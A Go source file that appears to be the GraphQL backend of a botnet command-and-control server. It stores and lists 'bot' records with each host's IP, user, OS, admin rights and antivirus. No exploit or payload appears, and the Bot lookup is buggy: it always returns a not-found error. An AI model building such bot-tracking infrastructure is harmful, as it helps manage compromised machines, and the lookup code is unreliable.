package command_control

import (
	"context"
	"fmt"

	"github.com/gobuffalo/pop"

	"github.com/MShoaei/command_control/models"
	"github.com/gofrs/uuid"
)

type Resolver struct {
	db *pop.Connection
	// bots []models.Bot
}

func (r *Resolver) Mutation() MutationResolver {
	return &mutationResolver{r}
}
func (r *Resolver) Query() QueryResolver {
	return &queryResolver{r}
}

type mutationResolver struct{ *Resolver }

func (r *mutationResolver) CreateBot(ctx context.Context, input models.NewBot) (models.Bot, error) {
	newID, _ := uuid.NewV4()
	bot := models.Bot{
		ID:          newID.String(),
		IP:          input.IP,
		WhoAmI:      input.WhoAmI,
		Os:          input.Os,
		InstallDate: input.InstallDate,
		Admin:       input.Admin,
		Av:          input.Av,
		CPU:         input.CPU,
		Gpu:         input.Gpu,
		Version:     input.Version,
	}
	r.db.Save(bot)
	// r.bots = append(r.bots, bot)
	return bot, nil
}

type queryResolver struct{ *Resolver }

func (r *queryResolver) Bots(ctx context.Context) ([]models.Bot, error) {
	bots := []models.Bot{}
	err := r.db.All(&bots)
	if err != nil {
		return nil, err
	}
	return bots, nil
}
func (r *queryResolver) Bot(ctx context.Context, id string) (*models.Bot, error) {
	bot := models.Bot{}
	r.db.Find(&bot, id)
	return nil, fmt.Errorf("'ID' not found")
}
